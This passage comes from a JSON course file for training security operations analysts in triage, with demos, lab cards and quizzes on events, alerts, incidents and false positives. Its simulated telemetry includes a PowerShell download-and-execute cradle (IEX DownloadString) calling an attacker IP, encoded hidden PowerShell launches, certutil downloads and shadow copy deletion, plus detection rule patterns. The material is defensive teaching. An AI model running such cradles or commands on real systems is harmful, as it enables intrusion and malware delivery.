            "Summary Hierarchy: Millions of Events -> Thousands of Alerts -> Tens of Confirmed Incidents -> Documented Cases."
          ],
          "knowMore": {
            "title": "ISO/IEC 27035: Information Security Incident Management Standard",
            "description": "Learn the international standard for managing security incidents, structuring investigation cases, and documenting legal evidence.",
            "externalUrl": "https://www.iso.org/standard/60803.html",
            "externalLabel": "ISO 27035 Incident Standard"
          }
        },
        "demo": {
          "title": "[Demo] The Event -> Alert -> Incident -> Case Funnel",
          "subtitle": "Observe how a confirmed ransomware attack progresses through each operational classification",
          "steps": [
            {
              "id": 1,
              "stage": "Raw Event",
              "iconName": "endpoint",
              "title": "File Modification Recorded",
              "description": "User workstation modifies 300 docx files within 10 seconds. Recorded as Windows File System Event 4663.",
              "telemetrySnippet": "Event 4663: Object Modified | File=invoice.docx.locked | Process=vssadmin.exe",
              "highlightText": "A raw event generated by Windows file auditing."
            },
            {
              "id": 2,
              "stage": "SIEM Alert",
              "iconName": "siem",
              "title": "Ransomware Canary Rule Fires",
              "description": "SIEM detects canary file encryption and volume shadow copy deletion commands.",
              "telemetrySnippet": "ALERT: Ransomware Activity Detected | Host=WS-088 | Confidence=High",
              "highlightText": "Correlation rule flags suspicious high-velocity file rename behavior."
            },
            {
              "id": 3,
              "stage": "Confirmed Incident",
              "iconName": "analyst",
              "title": "Analyst Confirms Active Intrusion",
              "description": "Tier 1 verifies ransomware note on desktop and active C2 beaconing. Threat confirmed: Declared Security Incident.",
              "telemetrySnippet": "STATUS: Confirmed Security Incident | Severity: Critical | Action: Host Isolated",
              "highlightText": "An incident is declared when malicious impact or breach is validated."
            },
            {
              "id": 4,
              "stage": "Formal Case",
              "iconName": "server",
              "title": "Incident Case Opened in Ticketing System",
              "description": "Case INC-2026-904 opened. Legal, PR, IT, and Tier 2 responders added to collaboration channel with timeline tracker.",
              "telemetrySnippet": "CASE INC-2026-904: Ransomware Outbreak WS-088 | SLA: 1h Containment | Lead: Tier 2",
              "highlightText": "The case tracks all chain-of-custody evidence, actions, and post-mortem reporting."
            }
          ]
        },
        "interactive": {
          "title": "Incident vs. Case Triage Drill",
          "scenario": "Evaluate the four investigation artifacts and verify whether each represents an Event, Alert, Incident, or Case.",
          "cards": [
            {
              "id": "ev-c-event",
              "category": "Event ID",
              "label": "Firewall Traffic Log Entry",
              "summary": "ALLOW TCP 10.0.1.5:443 to 142.250.190.46:443.",
              "detailedFindings": "Standard outbound HTTPS traffic to Google infrastructure. Routine network telemetry.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-c-alert",
              "category": "Timeline",
              "label": "Unusual Geo-Location Login Alert",
              "summary": "User logged in from UK and Nigeria within 10 minutes.",
              "detailedFindings": "Flagged by Azure AD Identity Protection. Awaiting Tier 1 verification of VPN travel.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-c-incident",
              "category": "User",
              "label": "Confirmed Data Exfiltration",
              "summary": "Compromised service account uploaded 40GB to MEGA.nz.",
              "detailedFindings": "Active credential theft and external exfiltration confirmed. Escalated for emergency response.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-c-case",
              "category": "Source IP",
              "label": "Legal Hold Investigation Case #509",
              "summary": "Documented case folder for Q1 Insider Threat Audit.",
              "detailedFindings": "Contains forensic disk images, signed analyst attestations, and timeline exhibits for legal counsel.",
              "severityIndicator": "Suspicious"
            }
          ]
        },
        "socContext": {
          "title": "Chain of Custody and Evidence Integrity",
          "scenario": "During a breach investigation, an analyst copies malware samples onto a personal USB drive without hashing or recording dates.",
          "analystMindset": "In a court of law or regulatory hearing, undocumented evidence is inadmissible. A formal Case guarantees cryptographic hashing (SHA256) and audit logging.",
          "bestPractices": [
            "Record SHA-256 hashes of all suspicious binaries and files before interacting with them.",
            "Never execute unapproved remediations without logging the action in the Case ticket.",
            "Ensure incident declarations follow the organizational escalation matrix immediately."
          ]
        },
        "knowledgeCheck": {
          "matching": {
            "title": "Match Definitions: Event, Alert, Incident, Case",
            "instructions": "Match each term with its correct security operations definition.",
            "pairs": [
              {
                "id": "t1",
                "left": "Event",
                "right": "Any observable technical occurrence on host or network"
              },
              {
                "id": "t2",
                "left": "Alert",
                "right": "Signal generated by rule matching potential maliciousness"
              },
              {
                "id": "t3",
                "left": "Incident",
                "right": "Confirmed security compromise requiring active response"
              },
              {
                "id": "t4",
                "left": "Case",
                "right": "Formal documented investigation file tracking evidence and timeline"
              }
            ],
            "explanation": "Events are raw facts; Alerts are filtered warnings; Incidents are confirmed attacks; Cases are documented investigation records."
          }
        }
      }
    ],
    "assessment": {
      "id": "unit-2-assessment",
      "title": "Topic 2 Assessment: Alerts & Events Mastery",
      "passingScore": 75,
      "xpReward": 100,
      "questions": [
        {
          "id": "u2-q1",
          "question": "What distinguishes a security Alert from a raw security Event?",
          "options": [
            "Events are always malicious, whereas alerts are benign",
            "An alert is generated when an event (or correlation of events) triggers a detection rule",
            "Events only come from firewalls, while alerts come from antivirus",
            "Alerts are stored in cold storage while events are displayed on dashboards"
          ],
          "correctAnswer": 1,
          "explanation": "Events are raw operational records; an alert is generated only when events meet specific detection or threshold rules."
        },
        {
          "id": "u2-q2",
          "question": "Under what condition should a Tier 1 analyst declare a formal Security Incident?",
          "options": [
            "Immediately whenever any alert is received in the queue",
            "When triage investigation confirms that unauthorized, malicious, or policy-violating activity has occurred",
            "Only after senior management approves via email",
            "Only if the company stock price drops"
          ],
          "correctAnswer": 1,
          "explanation": "An incident is declared once verification confirms true malicious intent or unauthorized impact on assets."
        },
        {
          "id": "u2-q3",
          "question": "What is the primary operational purpose of opening an investigation Case in the ticketing system?",
          "options": [
            "To delete old event logs and save disk space",
            "To track investigation evidence, timeline, actions taken, and legal chain of custody",
            "To prevent other analysts from seeing the alert",
            "To automatically reset all passwords across the domain"
          ],
          "correctAnswer": 1,
          "explanation": "A Case serves as the formal repository documenting forensic evidence, actions, timeline, and post-incident remediation."
        },
        {
          "id": "u2-q4",
          "question": "If an enterprise generates 50,000,000 firewall events per day, why does the SOC not investigate each event individually?",
          "options": [
            "Firewall events are always encrypted and cannot be viewed",
            "The vast majority are legitimate, routine network traffic; correlation rules filter for anomalous threat patterns to prevent analyst overwhelm",
            "Firewalls are not part of SOC monitoring",
            "Analysts only work 2 hours a day"
          ],
          "correctAnswer": 1,
          "explanation": "Filtering and correlation rules reduce millions of routine events into a manageable queue of high-probability candidate alerts."
        }
      ]
    }
  },
  {
    "id": "unit-3",
    "unitNumber": 3,
    "title": "Unit 3: Alert Triage",
    "description": "Master systematic alert triage: understand the alert signature, extract core entities (User, Host, IP), verify evidence, and investigate real-world attacks.",
    "estimatedHours": 2,
    "topics": [
      {
        "id": "topic-3-1",
        "unitId": "unit-3",
        "title": "Topic 1: Understand Alert & Identify Entities (User, Host, IP)",
        "order": 1,
        "estimatedMinutes": 20,
        "xpReward": 50,
        "theory": {
          "summaryLines": [
            "Alert triage is the systematic process of evaluating an incoming alert to determine whether it is a True Positive, False Positive, or Benign.",
            "Step 1: Understand the Alert. Read the detection logic, trigger signature, MITRE technique (e.g. T1059.001 PowerShell), and triggered rule conditions.",
            "Step 2: Identify the User entity. Determine account name, privilege level (Domain Admin vs standard user), business department, and employment status.",
            "Step 3: Identify the Host entity. Extract hostname, operating system, IP address, asset criticality (Domain Controller vs guest Wi-Fi laptop).",
            "Step 4: Identify the IP entities. Determine internal private IPs (RFC 1918) vs external public IPs, and query Threat Intelligence (VirusTotal, AbuseIPDB)."
          ],
          "knowMore": {
            "title": "SANS Triage Playbook: Essential Questions for Alert Validation",
            "description": "Learn the standardized 5-question methodology used by enterprise SOCs to rapidly qualify security alerts.",
            "externalUrl": "https://www.sans.org/blog/soc-alert-triage-methodology/",
            "externalLabel": "SANS Alert Triage Guide"
          }
        },
        "demo": {
          "title": "[Demo] Alert Triage: Entity Extraction Workflow",
          "subtitle": "Step through decomposing a raw SIEM alert into its core investigative entities",
          "steps": [
            {
              "id": 1,
              "stage": "Alert Ingestion",
              "iconName": "siem",
              "title": "Review Alert Signature & Description",
              "description": "Alert: \"Suspicious Encoded PowerShell Execution via WMI\". Rule checks for -encodedcommand parameter.",
              "telemetrySnippet": "ALERT: RuleID=WIN-PS-042 | Host=FIN-WS-09 | MITRE=T1059.001 | Severity=High",
              "highlightText": "Understand what triggered the alert before digging into raw logs."
            },
            {
              "id": 2,
              "stage": "User Extraction",
              "iconName": "analyst",
              "title": "Identify User Context & Privileges",
              "description": "Extract AccountName=\"John.Doe\". Active Directory lookup reveals John is a Finance clerk, not IT or dev.",
              "telemetrySnippet": "AD LOOKUP: User=\"John.Doe\" | Dept=\"Accounts Payable\" | Privileges=\"Domain Users\" | Status=\"Active\"",
              "highlightText": "A finance user running encoded PowerShell is anomalous and suspicious."
            },
            {
              "id": 3,
              "stage": "Host Extraction",
              "iconName": "endpoint",
              "title": "Identify Host Context & Criticality",
              "description": "Hostname=\"FIN-WS-09\", IP=10.0.4.15. Asset DB classifies it as Tier 3 Desktop in Financial HQ.",
              "telemetrySnippet": "CMDB: Host=\"FIN-WS-09\" | OS=\"Windows 11 Enterprise\" | Criticality=\"Medium\" | PatchLevel=\"Current\"",
              "highlightText": "Asset criticality determines the potential blast radius of compromise."
            },
            {
              "id": 4,
              "stage": "IP Intelligence",
              "iconName": "server",
              "title": "External IP Reputation Check",
              "description": "PowerShell payload connected to external destination 198.51.100.42. Threat Intel check returns 48/88 malicious flags.",
              "telemetrySnippet": "VIRUSTOTAL: IP=198.51.100.42 | Category=\"Cobalt Strike C2\" | AbuseScore=98%",
              "highlightText": "External malicious IP confirmation proves true positive attacker communication."
            }
          ]
        },
        "interactive": {
          "title": "Entity Extraction from Raw Alert Payload",
          "scenario": "Analyze the alert payload below and inspect each extracted entity to confirm its role in the attack chain.",
          "cards": [
            {
              "id": "ev-user-ent",
              "category": "User",
              "label": "Account: CORP\\jdoe",
              "summary": "Standard corporate Active Directory account.",
              "detailedFindings": "User in Accounting department. Not authorized to execute remote administrative scripts or PsExec.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-host-ent",
              "category": "Event ID",
              "label": "Host: FIN-WS-09 (10.0.4.15)",
              "summary": "Internal Windows 11 Accounting workstation.",
              "detailedFindings": "Connected to internal subnet VLAN 40. Recently accessed payroll file share before alert fired.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-ip-ent",
              "category": "Source IP",
              "label": "Destination IP: 198.51.100.42:8443",
              "summary": "External Russian VPS IP hosting Cobalt Strike beacon.",
              "detailedFindings": "Flagged on 4 Threat Intel feeds. Reverse DNS points to dynamic DNS hostname fastflux-dns.ru.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-time-ent",
              "category": "Timeline",
              "label": "Timestamp: 03:14:22 UTC (Saturday)",
              "summary": "Out-of-hours activity during weekend maintenance window.",
              "detailedFindings": "No approved change tickets scheduled for accounting workstations on this weekend.",
              "severityIndicator": "Malicious"
            }
          ]
        },
        "socContext": {
          "title": "The Triage Checklist: Who, What, Where, When, Why",
          "scenario": "An inexperienced analyst closes an alert because the user claimed \"I clicked a link but nothing happened.\"",
          "analystMindset": "Trust telemetry, verify claims. Always check the machine data regardless of what users state.",
          "bestPractices": [
            "Correlate the User across HR databases to check if they are on leave or traveling.",
            "Determine whether the Host is a physical endpoint, virtual desktop, or server.",
            "Cross-reference IP addresses against internal RFC 1918 ranges to isolate lateral movement from external egress."
          ]
        },
        "knowledgeCheck": {
          "dragDrop": {
            "title": "Order the Initial Triage Investigation Steps",
            "instructions": "Arrange the 4 steps an analyst must take upon claiming a new alert.",
            "items": [
              {
                "id": "ts-1",
                "label": "1. Read Alert Signature & Detection Rule Logic",
                "order": 1
              },
              {
                "id": "ts-2",
                "label": "2. Extract User, Host, and IP Entities",
                "order": 2
              },
              {
                "id": "ts-3",
                "label": "3. Verify External Threat Intel on Destination IPs/Hashes",
                "order": 3
              },
              {
                "id": "ts-4",
                "label": "4. Corroborate Host Process Telemetry in EDR/Sysmon",
                "order": 4
              }
            ],
            "explanation": "Begin with understanding the rule, extract entities, check external reputation, and then dive deep into host execution telemetry."
          }
        }
      },
      {
        "id": "topic-3-2",
        "unitId": "unit-3",
        "title": "Topic 2: Check Evidence & [Lab] 🔵 Basic Alert Triage",
        "order": 2,
        "estimatedMinutes": 25,
        "xpReward": 75,
        "theory": {
          "summaryLines": [
            "Once entities are identified, the analyst must check corroborating evidence to prove or disprove malicious activity.",
            "Process Lineage: Examine parent-child relationships (e.g. WINWORD.EXE spawning powershell.exe is a classic malicious execution chain).",
            "Command Line Parameters: Decode Base64 strings, analyze switches (-w hidden, -nop, -enc), and look for obfuscation techniques.",
            "File System & Hashes: Look up SHA-256 hashes in EDR and VirusTotal; verify if files were created in temporary directories (%AppData%, %Temp%).",
            "Network Flows: Corroborate endpoint process activity with firewall or proxy logs to verify data transfer volumes."
          ],
          "knowMore": {
            "title": "MITRE ATT&CK: T1059 Command and Scripting Interpreter Triage",
            "description": "Learn how to detect and investigate living-off-the-land script interpreters used by initial access brokers.",
            "externalUrl": "https://attack.mitre.org/techniques/T1059/",
            "externalLabel": "MITRE ATT&CK T1059"
          }
        },
        "demo": {
          "title": "[Demo] Checking Process Evidence in EDR Telemetry",
          "subtitle": "Analyze the process execution tree to uncover a weaponized Word document attack",
          "steps": [
            {
              "id": 1,
              "stage": "Parent Process",
              "iconName": "endpoint",
              "title": "Microsoft Word Launches from Outlook",
              "description": "User opened email attachment \"Overdue_Invoice.docm\" from Outlook.",
              "telemetrySnippet": "PARENT: \"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"",
              "highlightText": "Normal office application execution by user."
            },
            {
              "id": 2,
              "stage": "Abnormal Child Process",
              "iconName": "endpoint",
              "title": "Word Spawns PowerShell with Encoded Switch",
              "description": "VBA Macro executes powershell.exe with hidden window and bypass flags.",
              "telemetrySnippet": "CHILD: powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgA...",
              "highlightText": "Word should NEVER spawn PowerShell—this is a high-confidence indicator of compromise (IOC)."
            },
            {
              "id": 3,
              "stage": "Decoded Payload",
              "iconName": "analyst",
              "title": "De-obfuscating the Base64 Command",
              "description": "Analyst decodes UTF-16LE payload using CyberChef: IEX (New-Object Net.WebClient).DownloadString(\"http://198.51.100.42/payload.ps1\")",
              "telemetrySnippet": "DECODED: Download & Execute staged payload from 198.51.100.42",
              "highlightText": "Confirming attacker code download proves active exploitation."
            },
            {
              "id": 4,
              "stage": "Network Corroboration",
              "iconName": "server",
              "title": "Proxy Log Matches Endpoint Timestamp",
              "description": "Corporate egress proxy records HTTP 200 GET for payload.ps1 with 84,200 bytes transferred.",
              "telemetrySnippet": "PROXY: 10.0.4.15 -> 198.51.100.42/payload.ps1 HTTP/1.1 200 84200 bytes",
              "highlightText": "Evidence from multiple independent log sources confirms the attack succeeded."
            }
          ]
        },
        "interactive": {
          "title": "[Lab] 🔵 Basic Alert Triage: Suspicious Script Execution",
          "scenario": "You are investigating Alert ALT-4401 on Host FIN-WS-09. Click each evidence card to review findings and decide the triage verdict.",
          "cards": [
            {
              "id": "ev-proc-tree",
              "category": "Event ID",
              "label": "Process Lineage (Sysmon Event 1)",
              "summary": "WINWORD.EXE -> cmd.exe -> powershell.exe.",
              "detailedFindings": "Word document executed cmd.exe which spawned encoded powershell.exe. Parent PID matched active user session.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-cmdline",
              "category": "User",
              "label": "Decoded Script Arguments",
              "summary": "Base64 string decodes to web download cradle.",
              "detailedFindings": "Command downloads payload from http://198.51.100.42/staged.exe and writes to C:\\Users\\Public\\svchost.exe.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-hash",
              "category": "Source IP",
              "label": "File Hash: staged.exe (SHA256)",
              "summary": "Hash: 4a2b91e... matches Emotet dropper.",
              "detailedFindings": "VirusTotal score: 62/70 security vendors classify as malicious banking Trojan / initial access botnet.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-net",
              "category": "Timeline",
              "label": "Firewall Egress Connection",
              "summary": "Established TCP connection to port 8443 on external host.",
              "detailedFindings": "Ongoing 120-second heartbeat beaconing observed in firewall session logs after payload execution.",
              "severityIndicator": "Malicious"
            }
          ]
        },
        "socContext": {
          "title": "Decisive Triage Under SLA Pressure",
          "scenario": "An alert must be triaged within 15 minutes. The analyst finds an encoded script but cannot decode all 4,000 characters immediately.",
          "analystMindset": "Triage does not require full reverse-engineering; it requires proving or disproving malicious intent. WINWORD spawning PowerShell downloading external binaries is 100% True Positive.",
          "bestPractices": [
            "Isolate the host immediately via EDR when execution of an unknown dropper is confirmed.",
            "Export process execution command lines directly into the incident ticket.",
            "Collect RAM and triage packages before rebooting the compromised asset."
          ]
        },
        "knowledgeCheck": {
          "triageScenario": {
            "id": "ts-triage-lab",
            "alertName": "Alert ALT-4401: Suspicious Child Process Spawned by Office",
            "severity": "HIGH",
            "scenarioText": "Host FIN-WS-09 (Finance) opened an attachment. Word spawned PowerShell with Base64 arguments connecting to an external Russian IP with a known dropper hash.",
            "evidenceItems": [
              {
                "label": "Parent Process",
                "value": "WINWORD.EXE",
                "insight": "Abnormal macro execution"
              },
              {
                "label": "Child Process",
                "value": "powershell.exe -enc ...",
                "insight": "Encoded download string"
              },
              {
                "label": "External IP",
                "value": "198.51.100.42:8443",
                "insight": "Active Cobalt Strike C2"
              }
            ],
            "correctVerdict": "TRUE_POSITIVE",
            "rationale": "Office applications spawning hidden PowerShell sessions that establish external network connections is confirmed malicious code execution.",
            "analystAction": "Isolate host FIN-WS-09 from the network via EDR, terminate PowerShell PID, and escalate to Tier 2."
          }
        }
      }
    ],
    "assessment": {
      "id": "unit-3-assessment",
      "title": "Topic 3 Assessment: Alert Triage Methodology",
      "passingScore": 75,
      "xpReward": 100,
      "questions": [
        {
          "id": "u3-q1",
          "question": "What is the very first step an analyst should perform when opening a newly assigned alert?",
          "options": [
            "Immediately isolate the domain controller",
            "Read and understand the alert rule logic, trigger signature, and intended threat category",
            "Delete the alert from the queue to keep SLA low",
            "Call the user on the phone"
          ],
          "correctAnswer": 1,
          "explanation": "Before investigating entities, you must understand what specific detection rule fired and why it was created."
        },
        {
          "id": "u3-q2",
          "question": "In process lineage analysis, which of the following parent-child relationships is most indicative of malicious activity?",
          "options": [
            "explorer.exe spawning chrome.exe",
            "services.exe spawning svchost.exe",
            "WINWORD.EXE spawning powershell.exe with -enc arguments",
            "system spawning smss.exe"
          ],
          "correctAnswer": 2,
          "explanation": "Microsoft Office applications (Word, Excel) spawning command interpreters (cmd.exe, powershell.exe) is a classic macro attack pattern."
        },
        {
          "id": "u3-q3",
          "question": "When checking external IP reputation during entity extraction, what does a high Abuse Confidence Score (90%+) on AbuseIPDB signify?",
          "options": [
            "The IP belongs to a trusted government agency",
            "Multiple independent organizations have recently reported malicious activity (brute force, C2, scanning) originating from that IP",
            "The IP address is definitely offline",
            "The alert should be closed as false positive"
          ],
          "correctAnswer": 1,
          "explanation": "High abuse scores reflect verified recent malicious activity reported across global networks."
        },
        {
          "id": "u3-q4",
          "question": "Why should an analyst NOT reboot an endpoint immediately upon confirming a true positive malware infection?",
          "options": [
            "Rebooting deletes all logs permanently from the SIEM",
            "Volatile evidence stored in RAM (decrypted malware keys, active C2 sockets, injected code) will be permanently lost",
            "Rebooting upgrades Windows automatically",
            "Analysts are not allowed to reboot computers"
          ],
          "correctAnswer": 1,
          "explanation": "Rebooting destroys RAM and volatile memory. The analyst should isolate the host via EDR network containment while keeping power on for forensic memory capture."
        }
      ]
    }
  },
  {
    "id": "unit-4",
    "unitNumber": 4,
    "title": "Unit 4: False Positives",
    "description": "Learn to accurately differentiate malicious intrusions from expected administrative activity, benign software behavior, and SIEM detection errors.",
    "estimatedHours": 2,
    "topics": [
      {
        "id": "topic-4-1",
        "unitId": "unit-4",
        "title": "Topic 1: Expected Activity & Benign Behavior",
        "order": 1,
        "estimatedMinutes": 20,
        "xpReward": 50,
        "theory": {
          "summaryLines": [
            "A False Positive (FP) occurs when a security rule triggers on activity that is completely legitimate, authorized, or benign.",
            "Expected Activity includes scheduled IT tasks: vulnerability scanners (Nessus/Qualys), backup software (Veeam), software deployment (SCCM/Intune), and approved penetration tests.",
            "Benign Activity includes legitimate administrative tools (Living off the Land) such as IT admins using PsExec, PowerShell, or certutil to update certificates.",
            "A True Positive (TP) is confirmed malicious or unauthorized activity matching attacker tactics.",
            "A Benign True Positive (BTP) is authorized activity that technically matches rule logic (e.g. an approved IT script using whoami.exe for hardware inventory)."
          ],
          "knowMore": {
            "title": "NIST: Minimizing False Positive Rates in Intrusion Detection",
            "description": "Learn scientific approaches for measuring False Positive Rates (FPR), tuning detection filters, and maintaining high precision in SOC alerting.",
            "externalUrl": "https://csrc.nist.gov/glossary/term/false_positive",
            "externalLabel": "NIST False Positive Guide"
          }
        },
        "demo": {
          "title": "[Demo] Distinguishing Legitimate Admin Tooling from Attacks",
          "subtitle": "Compare an authorized sysadmin script vs an attacker executing Living-off-the-Land commands",
          "steps": [
            {
              "id": 1,
              "stage": "Alert Trigger",
              "iconName": "siem",
              "title": "Alert: \"Certutil Used to Download Binary\"",
              "description": "Rule triggers on certutil.exe with -urlcache -split flags on workstation IT-MGMT-01.",
              "telemetrySnippet": "RULE: Living-off-the-Land | Process=certutil.exe | Args=\"-urlcache -split http://... \"",
              "highlightText": "Certutil is frequently abused by attackers to download payloads, but also used by admins."
            },
            {
              "id": 2,
              "stage": "User & Asset Context",
              "iconName": "analyst",
              "title": "Verify Account and Workstation Context",
              "description": "Account=adm_sarah (Senior Sysadmin). Machine=IT-MGMT-01 (Designated Privileged Access Workstation).",
              "telemetrySnippet": "AD CHECK: User=\"adm_sarah\" | Group=\"Domain Admins\" | Host=\"PAW-IT-01\" | IP=10.0.1.5",
              "highlightText": "Activity originates from an approved administrative workstation by an authorized engineer."
            },
            {
              "id": 3,
              "stage": "Change Ticket Check",
              "iconName": "server",
              "title": "Check ServiceNow Change Management (ITSM)",
              "description": "Change Ticket CHG-8812 approved for today: \"Deploy internal root CA certificate update to subnets\".",
              "telemetrySnippet": "SERVICENOW CHG-8812: Approved Root CA Deployment | Owner: Sarah Jenkins | Window: 02:00-04:00",
              "highlightText": "Validating against scheduled change records proves authorized expected activity."
            },
            {
              "id": 4,
              "stage": "Verdict & Tuning",
              "iconName": "analyst",
              "title": "Classification: Benign True Positive (False Alarm)",
              "description": "Analyst closes ticket with resolution code \"FP - Approved Administrative Activity\" and tags rule for exclusion tuning.",
              "telemetrySnippet": "RESOLUTION: Closed Benign | Reason: CHG-8812 verified | Action: Exclude PAW-IT-01 from rule",
              "highlightText": "Documenting the change ticket allows rule tuning without compromising security."
            }
          ]
        },
        "interactive": {
          "title": "Administrative vs. Malicious Activity Evaluation",
          "scenario": "Inspect four scenarios and determine whether each is Malicious, Expected Admin Activity, or Normal User Behavior.",
          "cards": [
            {
              "id": "ev-fp-backup",
              "category": "User",
              "label": "User: svc_veeam",
              "summary": "Service account reading 50,000 files at 02:00 AM.",
              "detailedFindings": "Scheduled nightly backup job running from dedicated backup server 10.0.10.5 to SAN storage.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-fp-nessus",
              "category": "Source IP",
              "label": "IP: 10.0.99.10 (Scanner)",
              "summary": "Port scan of 1,000 hosts across port 445 and 3389.",
              "detailedFindings": "Source IP is the enterprise Tenable Nessus vulnerability scanner running weekly scheduled audit.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-fp-exec",
              "category": "Event ID",
              "label": "PsExec on Marketing Laptop",
              "summary": "PsExec service installed remotely from external IP.",
              "detailedFindings": "Source IP is a foreign residential address; account used was compromised via password spray.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-fp-curl",
              "category": "Timeline",
              "label": "Developer running curl in WSL",
              "summary": "Downloading npm packages from official registry.",
              "detailedFindings": "Destination registry.npmjs.org. Verified developer testing React application build.",
              "severityIndicator": "Normal"
            }
          ]
        },
        "socContext": {
          "title": "The Danger of Careless False Positive Closures",
          "scenario": "An attacker noticed that the SOC always ignores alerts on \"svc_scanner\", so they named their malware \"svc_scanner.exe\" to avoid detection.",
          "analystMindset": "Never judge an alert solely by the process name or username. Verify the full path, parent process, hash, and destination network.",
          "bestPractices": [
            "Always link an authorized Change Request (CHG#) or Jira ticket when closing as expected activity.",
            "Verify that the process hash matches the authentic vendor binary, not an imposter.",
            "Confirm that source and destination IP addresses match documented infrastructure zones."
          ]
        },
        "knowledgeCheck": {
          "matching": {
            "title": "Classify True vs False Positive Scenarios",
            "instructions": "Match each scenario to its correct classification.",
            "pairs": [
              {
                "id": "fp1",
                "left": "Vulnerability scanner runs authorized port sweep with change ticket",
                "right": "False Positive (Expected Activity)"
              },
              {
                "id": "fp2",
                "left": "Word doc spawns powershell downloading executable from unknown IP",
                "right": "True Positive (Malicious Attack)"
              },
              {
                "id": "fp3",
                "left": "HR user attempts 3 incorrect passwords after returning from vacation",
                "right": "False Positive (Benign User Error)"
              },
              {
                "id": "fp4",
                "left": "Ransomware deletes volume shadow copies via vssadmin",
                "right": "True Positive (Malicious Attack)"
              }
            ],
            "explanation": "Authorized and benign user actions are False Positives; unauthorized attacks are True Positives."
          }
        }
      },
      {
        "id": "topic-4-2",
        "unitId": "unit-4",
        "title": "Topic 2: Detection Errors & [Lab] 🔵 False-Positive Identification",
        "order": 2,
        "estimatedMinutes": 25,
        "xpReward": 75,
        "theory": {
          "summaryLines": [
            "Detection Errors occur when a correlation rule is poorly constructed, contains flawed regular expressions, or uses overly broad logic.",
            "Example of a Flawed Rule: Triggering on any command containing the word \"admin\" will generate hundreds of false alerts from administrative URLs and filenames.",
            "Example of a Flawed Threshold: Firing an alert on >3 failed logins in an hour triggers on every human employee who typos their credentials.",
            "The SIEM Tuning Loop: Tier 1 analysts must report flawed rules to Tier 3 detection engineers with concrete recommendations for rule refinement.",
            "Good rule refinement adds precise exclusions (e.g. filter by known Parent PID, specific signer certificates, or dedicated management subnets)."
          ],
          "knowMore": {
            "title": "Sigma HQ: Best Practices for Writing Robust Detection Rules",
            "description": "Read the official Sigma rule documentation on constructing precise condition logic that minimizes detection noise.",
            "externalUrl": "https://github.com/SigmaHQ/sigma",
            "externalLabel": "Sigma Rule Guidelines"
          }
        },
        "demo": {
          "title": "[Demo] Analyzing a Flawed Detection Rule",
          "subtitle": "Observe how an overly broad regex creates massive alert noise and how tuning resolves it",
          "steps": [
            {
              "id": 1,
              "stage": "Flawed Rule Logic",
              "iconName": "siem",
              "title": "Rule: \"Suspicious PowerShell Execution\"",
              "description": "Rule fires on: CommandLine CONTAINS \"powershell.exe\". No filters for arguments or parents.",
              "telemetrySnippet": "RULE QUERY: index=windows EventCode=4688 Image=\"*powershell.exe\"",
              "highlightText": "This rule triggers on every legitimate Windows background task, creating 2,000 alerts daily."
            },
            {
              "id": 2,
              "stage": "Noise Impact",
              "iconName": "analyst",
              "title": "Queue Overwhelmed with Benign Telemetry",
              "description": "Analysts spend 80% of their shift clicking \"close\" on routine Windows Defender update checks.",
              "telemetrySnippet": "ALERTS IN QUEUE: 1,842 New Alerts | 99.8% False Positive Rate",
              "highlightText": "Alert fatigue causes analysts to miss genuine attacks hidden in the noise."
            },
            {
              "id": 3,
              "stage": "Tuned Detection Rule",
              "iconName": "siem",
              "title": "Refined Rule with Contextual Logic",
              "description": "Tuned rule: Fires only if PowerShell has encoded commands OR was spawned by Office/browser parents.",
              "telemetrySnippet": "TUNED: ParentImage IN (\"*word.exe\",\"*excel.exe\") OR CommandLine IN (\"*-enc*\",\"*downloadstring*\")",
              "highlightText": "High precision logic reduces noise by 99% while catching true attacks."
            }
          ]
        },
        "interactive": {
          "title": "[Lab] 🔵 False-Positive Identification: 4 Real-World Scenarios",
          "scenario": "Review the 4 alert scenarios below. Analyze the evidence to determine which alert is a True Positive versus False Positive.",
          "cards": [
            {
              "id": "ev-fp-sc1",
              "category": "User",
              "label": "Case 1: IT Admin Script",
              "summary": "certutil.exe used to download root CA cert.",
              "detailedFindings": "Originates from Admin PAW workstation. Change ticket CHG-401 approved for PKI upgrade. Verified authentic cert.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-fp-sc2",
              "category": "Source IP",
              "label": "Case 2: Internal Vulnerability Scan",
              "summary": "10,000 SYN packets sent to web servers.",
              "detailedFindings": "Source IP 10.0.99.10 verified as corporate Qualys scanner. Matches weekly authorized security scan.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-fp-sc3",
              "category": "Event ID",
              "label": "Case 3: Macro Dropping Ransomware",
              "summary": "Excel spawned powershell downloading EXE.",
              "detailedFindings": "User in Logistics opened malicious shipment tracking attachment. Process tree confirms unauthorized download.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-fp-sc4",
              "category": "Timeline",
              "label": "Case 4: Software Deployment Agent",
              "summary": "SCCM installing Slack on 500 laptops.",
              "detailedFindings": "Parent process CcmExec.exe running under SYSTEM context during standard patch Tuesday deployment.",
              "severityIndicator": "Normal"
            }
          ]
        },
        "socContext": {
          "title": "Closing the Feedback Loop with Detection Engineering",
          "scenario": "An alert for \"Certutil Download\" triggers 40 times a week on the same software update script.",
          "analystMindset": "Do not just close false positives—fix them. Submit tuning tickets specifying the exact parent path and hash exclusions needed.",
          "bestPractices": [
            "Include the alert ID and raw log payload in all SIEM tuning requests.",
            "Never request a blanket exclusion of an entire binary (e.g. do not exclude all powershell.exe).",
            "Always test rule modifications in staging before deploying to the production alert queue."
          ]
        },
        "knowledgeCheck": {
          "triageScenario": {
            "id": "ts-fp-lab",
            "alertName": "Alert ALT-309: High-Volume Network Port Scan",
            "severity": "MEDIUM",
